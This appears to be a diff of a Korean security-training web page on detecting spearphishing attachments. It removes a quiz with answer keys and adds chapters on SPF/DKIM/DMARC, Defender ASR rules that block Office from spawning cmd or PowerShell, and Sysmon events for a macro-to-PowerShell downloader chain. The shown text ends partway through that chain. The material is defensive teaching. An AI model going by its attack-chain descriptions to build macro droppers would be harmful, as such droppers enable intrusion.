-                                <div class="text-slate-500 text-xs leading-relaxed font-mono whitespace-pre"># 힌트:</div>
-                                <div class="text-slate-500 text-xs leading-relaxed font-mono whitespace-pre"># - SPF 버전 선언: v=spf1</div>
-                                <div class="text-slate-500 text-xs leading-relaxed font-mono whitespace-pre"># - Google Workspace 발신 허가: include:_spf.google.com</div>
-                                <div class="text-slate-500 text-xs leading-relaxed font-mono whitespace-pre"># - 나머지 IP softfail: ~all</div>
-                            </div>
-                        </div>
-                        <div class="flex items-center justify-between mt-4">
-                            <button onclick="checkCodeFill_2()" class="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-6 rounded font-mono text-sm transition cursor-pointer">정답 확인</button>
-                            <button onclick="resetCodeFill_2()" class="bg-slate-200 dark:bg-slate-700 hover:bg-slate-300 dark:hover:bg-slate-600 text-slate-700 dark:text-slate-300 font-bold py-2 px-4 rounded font-mono text-sm transition cursor-pointer">↻ 초기화</button>
-                        </div>
-                        <div id="code-fill-result-2" class="hidden mt-4 p-4 rounded text-sm font-mono shadow-sm"></div>
-                    </div>
-                </div>
-            </section>
-
-            <!-- ═══════════════════════════════════════════════ -->
-            <!-- Quiz Section -->
-            <!-- ═══════════════════════════════════════════════ -->
-            <section id="quiz" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
-                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-blue-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-blue">#Q.</span> 종합 퀴즈</h2>
-                <div class="glass-panel p-6 rounded-xl">
-                    <div id="final-quiz" class="space-y-8">
-                        <div class="quiz-q" data-correct="2">
-                            <h3 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q1. VBA 매크로에서 문서를 열 때 자동 실행되는 프로시저 이름은?</h3>
-                            <div class="space-y-2 text-sm">
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq1" value="1" class="mr-3"> Main()
-                                </label>
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq1" value="2" class="mr-3"> AutoOpen() / Document_Open()
-                                </label>
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq1" value="3" class="mr-3"> OnLoad()
-                                </label>
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq1" value="4" class="mr-3"> Initialize()
-                                </label>
-                            </div>
-                            <div class="quiz-explanation hidden mt-2 p-3 rounded bg-blue-50 dark:bg-blue-900/20 text-xs text-blue-700 dark:text-blue-300">💡 VBA에서 AutoOpen()은 Word 문서가 열릴 때, Document_Open()은 이벤트 핸들러로서 자동 실행됩니다. 두 프로시저 모두 매크로 기반 공격의 진입점으로 사용됩니다.</div>
-                        </div>
-                        <div class="quiz-q" data-correct="3">
-                            <h3 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q2. SPF 레코드에서 ~all의 의미는?</h3>
-                            <div class="space-y-2 text-sm">
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq2" value="1" class="mr-3"> 모든 IP 허용
-                                </label>
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq2" value="2" class="mr-3"> 모든 IP 차단 (hard fail)
-                                </label>
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq2" value="3" class="mr-3"> 허가 목록에 없는 IP는 softfail
-                                </label>
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq2" value="4" class="mr-3"> SPF 검증을 건너뜀
-                                </label>
-                            </div>
-                            <div class="quiz-explanation hidden mt-2 p-3 rounded bg-blue-50 dark:bg-blue-900/20 text-xs text-blue-700 dark:text-blue-300">💡 ~all은 softfail로, 허가 목록에 없는 IP에서 발송된 이메일을 의심스러운 것으로 표시하지만 완전히 차단하지는 않습니다. -all(hard fail)은 완전 차단합니다.</div>
-                        </div>
-                        <div class="quiz-q" data-correct="1">
-                            <h3 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q3. 샌드박스 분석에서 WINWORD.EXE → cmd.exe → powershell.exe 프로세스 체인이 의미하는 것은?</h3>
-                            <div class="space-y-2 text-sm">
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq3" value="1" class="mr-3"> 매크로가 명령어를 실행하여 페이로드를 다운로드하는 패턴
-                                </label>
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq3" value="2" class="mr-3"> 정상적인 Office 업데이트 프로세스
-                                </label>
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq3" value="3" class="mr-3"> 사용자가 수동으로 PowerShell을 실행한 것
-                                </label>
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq3" value="4" class="mr-3"> Word 문서의 자동 저장 기능
-                                </label>
-                            </div>
-                            <div class="quiz-explanation hidden mt-2 p-3 rounded bg-blue-50 dark:bg-blue-900/20 text-xs text-blue-700 dark:text-blue-300">💡 정상적인 Office 프로세스는 cmd.exe나 powershell.exe를 자식 프로세스로 생성하지 않습니다. 이 패턴은 매크로가 Shell()을 통해 명령어를 실행하는 전형적인 악성 행위입니다.</div>
-                        </div>
-                        <div class="quiz-q" data-correct="2">
-                            <h3 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q4. oletools의 olevba가 제공하는 핵심 기능은?</h3>
-                            <div class="space-y-2 text-sm">
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq4" value="1" class="mr-3"> Office 파일의 디지털 서명 검증
-                                </label>
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq4" value="2" class="mr-3"> VBA 매크로 추출 및 위험도 평가
-                                </label>
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq4" value="3" class="mr-3"> Office 파일의 암호 해독
-                                </label>
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq4" value="4" class="mr-3"> Office 파일의 메타데이터 삭제
-                                </label>
-                            </div>
-                            <div class="quiz-explanation hidden mt-2 p-3 rounded bg-blue-50 dark:bg-blue-900/20 text-xs text-blue-700 dark:text-blue-300">💡 olevba는 Office 문서에서 VBA 매크로를 추출하고, AutoExec/Suspicious/IOC 등의 카테고리로 위험도를 평가합니다. 매크로를 실행하지 않고 정적 분석하므로 안전합니다.</div>
-                        </div>
-                        <div class="quiz-q" data-correct="4">
-                            <h3 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q5. YARA 규칙에서 OLE2 파일의 매직 바이트는?</h3>
-                            <div class="space-y-2 text-sm">
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq5" value="1" class="mr-3"> 50 4B 03 04 (PK)
-                                </label>
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq5" value="2" class="mr-3"> 4D 5A 90 00 (MZ)
-                                </label>
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq5" value="3" class="mr-3"> 25 50 44 46 (%PDF)
-                                </label>
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq5" value="4" class="mr-3"> D0 CF 11 E0 A1 B1 1A E1
-                                </label>
-                            </div>
-                            <div class="quiz-explanation hidden mt-2 p-3 rounded bg-blue-50 dark:bg-blue-900/20 text-xs text-blue-700 dark:text-blue-300">💡 OLE2(Compound File Binary Format) 파일의 매직 바이트는 D0 CF 11 E0 A1 B1 1A E1입니다. .doc, .xls, .ppt 등 구형 Office 형식에 사용됩니다. PK는 ZIP(Office 2007+), MZ는 PE 실행파일입니다.</div>
-                        </div>
-                        <div class="quiz-q" data-correct="3">
-                            <h3 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q6. DMARC 정책에서 p=reject의 의미는?</h3>
-                            <div class="space-y-2 text-sm">
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq6" value="1" class="mr-3"> 실패한 이메일을 스팸함으로 이동
-                                </label>
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq6" value="2" class="mr-3"> 실패한 이메일을 모니터링만 함
-                                </label>
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq6" value="3" class="mr-3"> SPF/DKIM 검증 실패 이메일을 거부
-                                </label>
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq6" value="4" class="mr-3"> 모든 이메일을 허용
-                                </label>
-                            </div>
-                            <div class="quiz-explanation hidden mt-2 p-3 rounded bg-blue-50 dark:bg-blue-900/20 text-xs text-blue-700 dark:text-blue-300">💡 DMARC p=reject는 SPF 또는 DKIM 검증에 실패한 이메일을 수신 서버에서 완전히 거부하도록 지시합니다. p=quarantine은 스팸함 이동, p=none은 모니터링만 수행합니다.</div>
-                        </div>
-                        <div class="quiz-q" data-correct="2">
-                            <h3 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q7. Sigma 규칙에서 Office의 의심스러운 자식 프로세스를 탐지할 때 사용하는 로그 카테고리는?</h3>
-                            <div class="space-y-2 text-sm">
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq7" value="1" class="mr-3"> network_connection
-                                </label>
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq7" value="2" class="mr-3"> process_creation
-                                </label>
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq7" value="3" class="mr-3"> file_creation
-                                </label>
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq7" value="4" class="mr-3"> registry_event
-                                </label>
-                            </div>
-                            <div class="quiz-explanation hidden mt-2 p-3 rounded bg-blue-50 dark:bg-blue-900/20 text-xs text-blue-700 dark:text-blue-300">💡 process_creation 카테고리는 새 프로세스 생성 이벤트(Sysmon EID 1)를 다룹니다. ParentImage 필드로 부모 프로세스(Office)를, Image 필드로 자식 프로세스(cmd, powershell)를 매칭합니다.</div>
-                        </div>
-                        <div class="quiz-q" data-correct="1">
-                            <h3 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q8. 피싱 시뮬레이션에서 조직의 목표 클릭률은?</h3>
-                            <div class="space-y-2 text-sm">
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq8" value="1" class="mr-3"> 5% 미만
-                                </label>
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq8" value="2" class="mr-3"> 20% 미만
-                                </label>
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq8" value="3" class="mr-3"> 50% 미만
-                                </label>
-                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
-                                    <input type="radio" name="fq8" value="4" class="mr-3"> 0% (완전 차단)
-                                </label>
-                            </div>
-                            <div class="quiz-explanation hidden mt-2 p-3 rounded bg-blue-50 dark:bg-blue-900/20 text-xs text-blue-700 dark:text-blue-300">💡 업계 표준에서 피싱 시뮬레이션 클릭률 목표는 5% 미만입니다. 0%는 비현실적이며, 20%를 초과하면 추가적인 보안 인식 교육이 시급합니다.</div>
-                        </div>
-                        <button onclick="gradeFinalQuiz()" class="bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 px-8 rounded-lg font-mono transition shadow-sm cursor-pointer">정답 확인</button>
-                    </div>
-                    <div id="quiz-result" class="hidden mt-6 p-4 rounded-lg text-sm font-mono shadow-sm"></div>
-                </div>
-            </section>
-
-            <!-- Final CTA -->
-            <div class="pt-12 pb-8 text-center border-t border-blue-400/30 mt-16">
-                <div class="inline-block bg-blue-500/20 text-blue-700 dark:text-blue-400 px-4 py-1 rounded-full font-bold text-sm mb-4 border border-blue-400">🎉 학습 완료</div>
-                <h2 class="text-3xl font-extrabold text-[#1e293b] dark:text-white mb-4">Spearphishing Attachment Analysis &amp; Detection 중급 과정을 완료했습니다!</h2>
-                <p class="text-cgray dark:text-slate-400 mb-8 max-w-xl mx-auto">스피어피싱 첨부파일 분석과 탐지 중급 학습을 마쳤습니다. 고급 과정에서 난독화 매크로 분석과 APT 캠페인 분석을 학습하세요.</p>
-                <button onclick="window.location.href='/'" class="inline-flex items-center gap-3 bg-gradient-to-r from-blue-600 to-blue-800 dark:from-blue-400 dark:to-blue-600 text-white dark:text-slate-900 px-8 py-4 rounded-xl font-bold shadow-lg transform transition hover:-translate-y-1 hover:shadow-2xl cursor-pointer">
-                    <span class="text-2xl">🚀</span><span>매트릭스 대시보드로 돌아가기</span>
-                </button>
+        <!-- ===================== Ch.2 이메일 게이트웨이 차단 분석 ===================== -->
+        <section id="ch2" data-chapter-id="ch2" class="section-observe mb-16 max-w-4xl mx-auto opacity-0 translate-y-10 transition-all duration-700">
+            <div class="flex items-center gap-3 mb-6">
+                <span class="shrink-0 w-10 h-10 rounded-xl bg-blue-600 text-white flex items-center justify-center font-black text-sm shadow">02</span>
+                <h2 class="text-2xl md:text-3xl font-extrabold text-slate-800 dark:text-white">이메일 게이트웨이 차단 분석</h2>
             </div>
+            <div class="glass-panel rounded-2xl p-6 md:p-8 space-y-6">
+                <div class="bg-blue-50 dark:bg-blue-900/30 p-4 rounded-xl border border-blue-200 dark:border-blue-700">
+                    <p class="text-sm font-bold text-blue-700 dark:text-blue-300">🎯 학습 목표</p>
+                    <p class="text-sm text-slate-600 dark:text-slate-300 mt-1">SPF, DKIM, DMARC 인증이 스피어피싱을 차단하는 원리와 이메일 보안 게이트웨이(SEG)의 동작 방식을 분석합니다.</p>
+                </div>
 
-        </div>
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">SPF (Sender Policy Framework)</h3>
+                <p class="text-sm leading-relaxed text-slate-600 dark:text-slate-300">SPF는 <span class="hl-teal">DNS TXT 레코드</span>에 허용된 발신 서버 IP를 등록하여, 수신 서버가 발신자의 정당성을 검증하는 프로토콜입니다. 공격자가 위조한 발신 주소는 SPF 검증에서 실패합니다.</p>
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre><span style="color:#F4D06F"># DNS TXT 레코드 조회</span>
+$ dig TXT example.com +short
+"v=spf1 ip4:203.0.113.0/24 include:_spf.google.com -all"
+
+<span style="color:#F4D06F"># SPF 검증 결과 (이메일 헤더에서 확인)</span>
+Authentication-Results: mx.google.com;
+    spf=<span style="color:#ef4444">fail</span> (google.com: domain of ceo@example.com
+    does not designate 185.234.72.11 as permitted sender)
+    smtp.mailfrom=ceo@example.com</pre>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">DKIM (DomainKeys Identified Mail)</h3>
+                <p class="text-sm leading-relaxed text-slate-600 dark:text-slate-300">DKIM은 발신 서버가 이메일에 <span class="hl-blue">암호화 서명</span>을 추가하여, 수신 서버가 이메일 본문이 전송 중 변조되지 않았음을 검증합니다. 공격자는 합법적 도메인의 개인키를 가지고 있지 않으므로 DKIM 서명을 위조할 수 없습니다.</p>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">DMARC (Domain-based Message Authentication)</h3>
+                <p class="text-sm leading-relaxed text-slate-600 dark:text-slate-300">DMARC는 SPF와 DKIM 결과를 결합하여 <span class="hl-yel">최종 처리 정책</span>을 결정합니다. <code class="bg-slate-200 dark:bg-slate-700 px-1 rounded text-xs">p=reject</code>로 설정하면 인증 실패 메일이 완전히 거부됩니다.</p>
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre><span style="color:#F4D06F"># DMARC 정책 레코드</span>
+$ dig TXT _dmarc.example.com +short
+"v=DMARC1; p=reject; rua=mailto:dmarc@example.com; pct=100"
+
+<span style="color:#F4D06F"># 정책 옵션 비교</span>
+p=none    → 모니터링만 (차단 안 함, 보고서만 수집)
+p=quarantine → 스팸 폴더로 격리
+p=reject  → 완전 거부 (가장 강력)</pre>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">SEG의 첨부파일 분석</h3>
+                <p class="text-sm leading-relaxed text-slate-600 dark:text-slate-300">Secure Email Gateway는 인증 외에도 첨부파일을 <span class="hl-teal">샌드박스</span>에서 실행하여 악성 행위를 탐지합니다. 매크로 포함 문서(.docm), 실행 파일(.exe), 스크립트(.vbs, .js) 등이 분석 대상입니다.</p>
+
+                <div class="bg-slate-100 dark:bg-slate-800 p-4 rounded-xl text-xs space-y-2">
+                    <p class="font-bold text-slate-700 dark:text-slate-200">SEG 첨부파일 처리 흐름:</p>
+                    <p class="text-slate-600 dark:text-slate-300">① 확장자/MIME 타입 검사 → ② 정적 AV 스캔 (시그니처 매칭) → ③ 샌드박스 동적 분석 (2~3분) → ④ 판정: Clean / Suspicious / Malicious</p>
+                </div>
+
+                <div class="bg-amber-50 dark:bg-amber-900/20 p-4 rounded-xl border border-amber-200 dark:border-amber-700 text-sm">
+                    <p class="font-bold text-amber-700 dark:text-amber-300">⚠️ 실무 참고</p>
+                    <p class="text-slate-600 dark:text-slate-300 mt-1">SPF/DKIM/DMARC는 <span class="hl-blue">발신자 위조(Spoofing)</span>를 차단하지만, 공격자가 합법적 메일 서비스(Gmail 등)로 발송하면 통과될 수 있습니다. 따라서 Layer 2 이상의 방어가 반드시 필요합니다.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===================== Ch.3 ASR Rule 매크로 차단 분석 ===================== -->
+        <section id="ch3" data-chapter-id="ch3" class="section-observe mb-16 max-w-4xl mx-auto opacity-0 translate-y-10 transition-all duration-700">
+            <div class="flex items-center gap-3 mb-6">
+                <span class="shrink-0 w-10 h-10 rounded-xl bg-blue-600 text-white flex items-center justify-center font-black text-sm shadow">03</span>
+                <h2 class="text-2xl md:text-3xl font-extrabold text-slate-800 dark:text-white">ASR Rule 매크로 차단 분석</h2>
+            </div>
+            <div class="glass-panel rounded-2xl p-6 md:p-8 space-y-6">
+                <div class="bg-blue-50 dark:bg-blue-900/30 p-4 rounded-xl border border-blue-200 dark:border-blue-700">
+                    <p class="text-sm font-bold text-blue-700 dark:text-blue-300">🎯 학습 목표</p>
+                    <p class="text-sm text-slate-600 dark:text-slate-300 mt-1">Windows Defender의 ASR(Attack Surface Reduction) 규칙이 Office 매크로 기반 공격을 차단하는 메커니즘을 분석합니다.</p>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">ASR이란?</h3>
+                <p class="text-sm leading-relaxed text-slate-600 dark:text-slate-300">ASR(Attack Surface Reduction)은 Microsoft Defender for Endpoint의 기능으로, <span class="hl-teal">공격자가 자주 악용하는 행위 패턴</span>을 사전에 차단합니다. 시그니처가 아닌 <span class="hl-blue">행위(behavior) 기반</span>이므로 알려지지 않은 공격도 차단할 수 있습니다.</p>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">피싱 관련 핵심 ASR 규칙</h3>
+                <div class="overflow-x-auto">
+                    <table class="w-full text-xs border-collapse">
+                        <thead><tr class="bg-slate-200 dark:bg-slate-700">
+                            <th class="p-2 text-left font-bold">규칙 이름</th>
+                            <th class="p-2 text-left font-bold">GUID</th>
+                            <th class="p-2 text-left font-bold">차단 대상</th>
+                        </tr></thead>
+                        <tbody>
+                            <tr class="border-b border-slate-200 dark:border-slate-700"><td class="p-2">Office 앱의 자식 프로세스 생성 차단</td><td class="p-2 font-mono text-[10px]">D4F940AB-401B-4EFC-AADC-AD5F3C50688A</td><td class="p-2">Word→cmd.exe, PowerShell</td></tr>
+                            <tr class="border-b border-slate-200 dark:border-slate-700"><td class="p-2">Office 앱의 실행 콘텐츠 생성 차단</td><td class="p-2 font-mono text-[10px]">3B576869-A4EC-4529-8536-B80A7769E899</td><td class="p-2">.exe, .dll 파일 생성</td></tr>
+                            <tr class="border-b border-slate-200 dark:border-slate-700"><td class="p-2">Office 매크로의 Win32 API 호출 차단</td><td class="p-2 font-mono text-[10px]">92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B</td><td class="p-2">VBA → CreateProcess 등</td></tr>
+                            <tr><td class="p-2">난독화된 스크립트 실행 차단</td><td class="p-2 font-mono text-[10px]">5BEB7EFE-FD9A-4556-801D-275E5FFC04CC</td><td class="p-2">AMSI 난독화 탐지</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">ASR 규칙 배포 (PowerShell / GPO)</h3>
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre><span style="color:#F4D06F"># PowerShell: ASR 규칙 활성화 (Block 모드)</span>
+Set-MpPreference -AttackSurfaceReductionRules_Ids `
+    D4F940AB-401B-4EFC-AADC-AD5F3C50688A `
+    -AttackSurfaceReductionRules_Actions Enabled
+
+<span style="color:#F4D06F"># 현재 ASR 규칙 상태 확인</span>
+Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
+
+<span style="color:#F4D06F"># ASR 이벤트 로그 확인</span>
+Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" |
+    Where-Object { $_.Id -eq 1121 -or $_.Id -eq 1122 } |
+    Select-Object TimeCreated, Message -First 10</pre>
+                </div>
+
+                <div class="bg-red-50 dark:bg-red-900/20 p-4 rounded-xl border border-red-200 dark:border-red-700 text-sm">
+                    <p class="font-bold text-red-700 dark:text-red-300">🔴 초급 과정 연결</p>
+                    <p class="text-slate-600 dark:text-slate-300 mt-1">초급 Ch.6에서 배운 <code class="bg-slate-200 dark:bg-slate-700 px-1 rounded text-xs">Sub AutoOpen()</code> → <code class="bg-slate-200 dark:bg-slate-700 px-1 rounded text-xs">Shell("powershell...")</code> 공격은 ASR 규칙 D4F940AB가 "Office 자식 프로세스 생성"을 차단하여 무력화됩니다.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===================== Ch.4 Sysmon 이벤트 ID별 탐지 분석 ===================== -->
+        <section id="ch4" data-chapter-id="ch4" class="section-observe mb-16 max-w-4xl mx-auto opacity-0 translate-y-10 transition-all duration-700">
+            <div class="flex items-center gap-3 mb-6">
+                <span class="shrink-0 w-10 h-10 rounded-xl bg-blue-600 text-white flex items-center justify-center font-black text-sm shadow">04</span>
+                <h2 class="text-2xl md:text-3xl font-extrabold text-slate-800 dark:text-white">Sysmon 이벤트 ID별 탐지 분석</h2>
+            </div>
+            <div class="glass-panel rounded-2xl p-6 md:p-8 space-y-6">
+                <div class="bg-blue-50 dark:bg-blue-900/30 p-4 rounded-xl border border-blue-200 dark:border-blue-700">
+                    <p class="text-sm font-bold text-blue-700 dark:text-blue-300">🎯 학습 목표</p>
+                    <p class="text-sm text-slate-600 dark:text-slate-300 mt-1">Sysmon(System Monitor)의 핵심 이벤트 ID를 이해하고, 스피어피싱 공격 체인의 각 단계에서 어떤 이벤트가 생성되는지 분석합니다.</p>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">Sysmon이란?</h3>
+                <p class="text-sm leading-relaxed text-slate-600 dark:text-slate-300">Sysmon은 Microsoft의 Sysinternals 도구로, Windows 이벤트 로그에 <span class="hl-teal">상세한 프로세스/네트워크/파일 활동</span>을 기록합니다. 기본 Windows 이벤트 로깅보다 훨씬 정밀한 정보를 제공하므로, SOC 분석에 필수적입니다.</p>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">피싱 공격 탐지용 핵심 이벤트 ID</h3>
+                <div class="space-y-3">
+                    <div class="bg-slate-100 dark:bg-slate-800 p-3 rounded-lg flex gap-3 items-start">
+                        <span class="shrink-0 bg-blue-600 text-white text-xs font-bold px-2 py-1 rounded">ID 1</span>
+                        <div><p class="text-sm font-bold text-slate-700 dark:text-slate-200">Process Create</p><p class="text-xs text-slate-500 dark:text-slate-400">프로세스 생성 기록. WINWORD.EXE → cmd.exe → powershell.exe 체인 탐지의 핵심</p></div>
+                    </div>
+                    <div class="bg-slate-100 dark:bg-slate-800 p-3 rounded-lg flex gap-3 items-start">
+                        <span class="shrink-0 bg-blue-600 text-white text-xs font-bold px-2 py-1 rounded">ID 3</span>
+                        <div><p class="text-sm font-bold text-slate-700 dark:text-slate-200">Network Connection</p><p class="text-xs text-slate-500 dark:text-slate-400">네트워크 연결 기록. C2 서버로의 아웃바운드 연결 탐지</p></div>
+                    </div>
+                    <div class="bg-slate-100 dark:bg-slate-800 p-3 rounded-lg flex gap-3 items-start">
+                        <span class="shrink-0 bg-blue-600 text-white text-xs font-bold px-2 py-1 rounded">ID 7</span>
+                        <div><p class="text-sm font-bold text-slate-700 dark:text-slate-200">Image Loaded</p><p class="text-xs text-slate-500 dark:text-slate-400">DLL 로드 기록. 악성 DLL 사이드로딩 탐지</p></div>
+                    </div>
+                    <div class="bg-slate-100 dark:bg-slate-800 p-3 rounded-lg flex gap-3 items-start">
+                        <span class="shrink-0 bg-blue-600 text-white text-xs font-bold px-2 py-1 rounded">ID 11</span>
+                        <div><p class="text-sm font-bold text-slate-700 dark:text-slate-200">File Create</p><p class="text-xs text-slate-500 dark:text-slate-400">파일 생성 기록. %TEMP%에 드롭되는 페이로드 탐지</p></div>
+                    </div>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">공격 체인과 Sysmon 이벤트 매핑</h3>
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre><span style="color:#F4D06F">═══ 스피어피싱 공격 → Sysmon 이벤트 체인 ═══</span>
+
+[사용자가 첨부파일 열기]
+  └→ <span style="color:#60a5fa">Event ID 1</span>  WINWORD.EXE 실행 (ParentImage: explorer.exe)
+
+[매크로 실행 → cmd.exe 호출]
+  └→ <span style="color:#60a5fa">Event ID 1</span>  cmd.exe 실행 (ParentImage: WINWORD.EXE) ⚠️ 핵심 탐지 포인트
+
+[PowerShell 다운로더 실행]
